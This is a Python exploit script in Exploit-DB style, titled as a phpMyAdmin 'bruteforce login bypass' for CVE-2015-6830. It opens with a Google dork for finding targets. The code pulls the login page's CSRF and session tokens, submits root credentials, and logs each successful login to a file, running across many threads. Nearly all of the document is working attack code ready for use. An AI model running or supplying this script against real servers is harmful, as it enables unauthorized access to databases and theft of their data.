"""
Exploit-Title: PHPMyAdmin 3.0 - Bruteforce Login Bypass
Author: Nikola Markovic (badgerinc23@gmail.com)
Date: 2023
Google-Dork: intext: phpMyAdmin
Vendor: https://www.phpmyadmin.net/
Version: >3.0 & 4.3.x before 4.3.13.2 and 4.4.x before 4.4.14.1
Tested on: win/linux/unix
Python-Version: 3.0
CVE : CVE-2015-6830
"""
import urllib.request
import urllib.parse
import urllib
import threading
import http.cookiejar
import re
import sys

def CheckLogin(target):
	passwords = ["123"]
	try:
		for password in passwords:
			print("Try Host: "+target+" with Combo: root/"+password+"!\n")
			load_token = urllib.request.Request(target)
			fetch_token = urllib.request.urlopen(load_token,timeout=2).read()
			token = re.findall(r'name="token" value="([\w\.-]+)"',fetch_token.decode('utf-8')) # token fetching
			session = re.findall(r'name="set_session" value="([\w\.-]+)"',fetch_token.decode('utf-8')) ## session token fetching
			login_data = urllib.parse.urlencode({ 'pma_username': "root", 'pma_password': password,'set_session': session[0], 'token':token}) ## injecting payload to bruteforce
			login = login_data.encode()
			cookies = http.cookiejar.CookieJar()
			opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookies))
			do_it = opener.open(target,login,timeout=2)
			check = do_it.read()
			if b"index.php?route=/logout" in check:
				f = open('bruted_pma','a')
				f.write(target+" Bruted: root/"+password+"\n")
				f.close()
	except:
		pass

if sys.argv[1]:
		t = threading.Thread(target=CheckLogin,args=(str(sys.argv[1]),))
		if threading.active_count() < 500:
			t.start()
		else:
			t.start()
			t.join()